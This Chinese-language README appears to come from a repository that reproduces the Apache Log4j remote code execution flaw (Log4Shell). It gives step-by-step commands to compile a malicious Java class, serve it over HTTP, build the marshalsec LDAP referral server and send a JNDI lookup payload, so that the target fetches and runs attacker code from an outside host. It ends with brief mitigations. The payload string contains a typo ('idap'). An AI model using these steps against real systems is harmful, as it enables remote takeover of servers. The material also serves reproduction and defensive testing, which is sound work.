# Apache-Log4j
Apache Log4j 远程代码执行

> 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响

### 触发步骤


1. 先编译Log4jRCE，这个是恶意java代码,需要预先编译成恶意java类。注意不要用版本太高的jdk编译，不然jdk低版本的靶机可能无法执行。随后启动http server
   1. 进入目录 `cd /home/remote`
   2. 编译 `javac Log4jRCE.java`
   3. 启动http server，python或php均可快速启动，如`php -S 0.0.0.0:8888`

2. 使用marshalsec的ldap server，访问这个ldap server内的任意资源都会被自动转发到http server的固定资源，这里需要转发到http server中的恶意java类文件
   1. `git clone https://github.com/mbechler/marshalsec.git`
   2. `cd marshalsec`
   3. `mvn clean package -DskipTests`
   4. 启动ldap server并配置转发资源 `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://(这里写http server在公网上的地址及端口)/#Log4jRCE"`
      此时对靶机提交${jndi:idap://ip:port/{随便写}}即可，ldap server会自动从http server中下载指定资源并返回给靶机。
3. log4j.java是一个简单的漏洞环境实现，在代码中对应位置写好ldap的地址即可。底层原理就是靶机会远程下载Log4jRCE.class，然后执行newInstance()，所以会执行static、构造函数代码。

### 修复方案：

（1）修改jvm参数
-Dlog4j2.formatMsgNoLookups=true

（2）修改配置
在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true
